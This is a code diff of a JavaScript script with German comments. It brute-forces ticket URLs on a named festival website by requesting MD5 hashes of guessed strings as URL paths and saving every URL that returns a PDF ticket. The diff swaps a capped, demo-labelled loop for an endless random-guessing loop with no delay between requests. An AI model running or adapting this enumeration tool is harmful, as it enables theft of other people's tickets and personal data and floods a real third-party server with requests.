@@ -6,6 +6,16 @@ const baseUrl = 'https://nolimitsfestivals.nl/tickets/';
 const delay = 0; // 1 Sekunde Verzögerung
 const hashesFile = 'processedHashes.txt';
 
+function generateRandomString() {
+    const length = Math.floor(Math.random() * 20) + 1; // Zufällige Länge zwischen 1 und 20
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    let result = '';
+    for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * characters.length));
+    }
+    return result;
+}
+
 function md5(data) {
     return crypto.createHash('md5').update(data).digest("hex");
 }
@@ -23,12 +33,12 @@ async function fetchURL(url) {
             }
 
             if (contentType === 'application/pdf') {
-                console.log('Success')
                 fs.appendFileSync('foundURLs.txt', `${url}\n`);
+                console.log("Success")
             } else {
-                console.log('Failure')
+                console.log("Failure")
             }
-            
+
             res.resume();
             resolve();
         }).on('error', (e) => {
@@ -48,12 +58,13 @@ async function bruteForceMD5() {
         }
     }
 
-    for (let i = 0; i < Math.pow(2, 24); i++) { // Limitiert auf 16 Millionen Versuche für Demonstrationszwecke
-        let hash = md5(i.toString());
+    while (true) {
+        const randomString = generateRandomString();
+        const hash = md5(randomString);
 
-        if (processedHashes.has(hash)) continue; // Überspringe, wenn bereits bearbeitet
+        if (processedHashes.has(hash)) continue;
 
-        let fullUrl = baseUrl + hash + '/';
+        const fullUrl = baseUrl + hash + '/';
         
         await fetchURL(fullUrl);
         await new Promise(resolve => setTimeout(resolve, delay));
